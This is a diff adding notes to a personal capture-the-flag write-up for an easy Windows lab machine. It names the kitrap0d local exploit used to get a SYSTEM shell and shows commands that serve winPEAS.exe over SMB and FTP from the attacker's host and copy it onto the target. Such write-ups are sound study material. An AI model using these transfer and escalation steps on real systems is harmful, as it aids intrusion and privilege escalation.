@@ -5,6 +5,8 @@ Level: Easy
 2. Cadaver - WebDav client for Linux
 3. davtest - Command line utility to check if you're allowed to upload file using PUT/Move Method. Uploads random files 
 4. local_exploit_Suggester.
+5. winPEAS.bat transfer to target. 
+6. Python to start the FTP server
 
 
 Following HTTP Methods were supported
@@ -78,3 +80,19 @@ From here, I had to reset this machine 3 times to use the local_exploit_suggeste
 ```
 
 Out of which I used exploit/windows/local/ms10_015_kitrap0d to get the system shell.
+
+At one point, I was struggling with transferring the winPEAS.exe (EXE File) onto the target server. I tried the impacket-smbserver.
+
+```
+On my kali
+impacket-smbserver a /home/ringbuffer/Downloads/Granny.htb 
+
+On the target
+c:\windows\temp>copy \\10.10.16.5\a\winPEAS.exe c:\windows\temp  #This might be the wrong format of the command. Because I note it down after I closed the tab :P
+```
+
+I used the python FTP server as well. The python's pyftpdlib library was used.
+
+```
+python -m pyftpdlib -p 21
+```
